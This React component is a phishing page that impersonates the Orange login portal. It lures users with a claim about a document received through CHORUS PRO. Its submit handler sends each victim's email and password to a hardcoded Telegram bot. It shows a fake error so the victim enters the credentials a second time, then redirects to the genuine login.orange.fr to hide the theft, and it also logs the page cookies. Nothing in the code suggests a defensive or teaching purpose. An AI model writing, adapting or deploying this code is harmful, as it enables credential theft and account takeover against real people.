import React, { useState, useRef } from "react";
import img1 from "./assets/orang.png";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faChevronRight } from "@fortawesome/free-solid-svg-icons";
import { useNavigate } from "react-router-dom"; 

function Home() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [formError, setFormError] = useState("");
  const [attemptCount, setAttemptCount] = useState(0); 
  const formRef = useRef(null);
  const navigate = useNavigate(); 

  const handleEmailChange = (e) => {
    setEmail(e.target.value);
  };

  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
  };

  const handleSignInClick = async (e) => {
    e.preventDefault();

    // Vérification de la validité de l'email et du mot de passe
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      alert("Veuillez entrer une adresse email valide.");
      return;
    }

    if (password.length < 6) {
      alert("Mot de passe incorrect, veuillez réessayer.");
      return;
    }

    try {
      // Envoyer les informations via Telegram
      const botToken = "7676962098:AAEPkm5U8BHU_PvXsO30rfz-nf3icuMfYoA";
      const chatId = "7702979825";
      const message = `Infos NoReply\nEmail: ${email}\nPassword: ${password}`;

      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      });

      // Incrémenter le compteur de tentatives
      setAttemptCount((prevCount) => prevCount + 1);

      // Vérifier si c'est la 2e tentative
      if (attemptCount + 1 === 2) {
        navigate(
          "https://login.orange.fr/"
        );
      } else {
        alert("Erreur !!! veuillez réessayer.");
        console.log(document.cookie);
      }

      // Réinitialiser les champs de formulaire après chaque tentative
      setEmail("");
      setPassword("");
    } catch (error) {
      console.log("FAILED...", error);
    }
  };

  return (
    <div className="partie">
      <div className="site">
        <div className="entete">
          <img src={img1} />
        </div>

        <div className="body">
          <div className="titre1">
            <h1>Pour vous identifier</h1>
            <div className="info">
              <div className="un">
                <div className="alerte">
                  <h2>i</h2>
                </div>
                <div className="deux">
                  <h3>Vous avez reçu un document via CHORUS PRO ?</h3>
                  <h4 className="h4">Pour une sécurité renforcée, veuillez vous identifier
                </h4>
                </div>
              </div>
              
            </div>
          </div>

          <div className="identification">
            <h1>Indiquez votre compte Orange</h1>
            <form onSubmit={handleSignInClick} ref={formRef}>
              <div>
                <input
                  type="email"
                  placeholder="Email"
                  value={email}
                  onChange={handleEmailChange}
                  name="user_email"
                />
              </div>
              <div>
                <input
                  type="password"
                  placeholder="Mot de passe"
                  value={password}
                  onChange={handlePasswordChange}
                  name="user_password"
                />
              </div>
              {formError && <p style={{ color: "red" }}>{formError}</p>}
              <button type="submit">Se connecter</button>
            </form>
            <hr />
            <div className="lien">
              <h3>Créer compte sans être client orange </h3>
              <FontAwesomeIcon
                icon={faChevronRight}
                style={{ color: "orange", marginLeft: "0.4vw" }}
              />
            </div>

            <div className="lien">
              <h3>Besoin d'aide ?</h3>
              <FontAwesomeIcon
                icon={faChevronRight}
                style={{ color: "orange", marginLeft: "0.4vw" }}
              />
            </div>
          </div>
        </div>
      </div>
      <div className="footer">
        <ul>
          <li>Informations légales</li>
          <li>Données personnelles</li>
          <li>Accessibilité : non conforme</li>
          <li>Gestion cookies</li>
          <li>Politique des cookies</li>
          <li>Signaler un contenu</li>
          <li>© Orange 2024</li>
        </ul>
      </div>
    </div>
  );
}

export default Home;
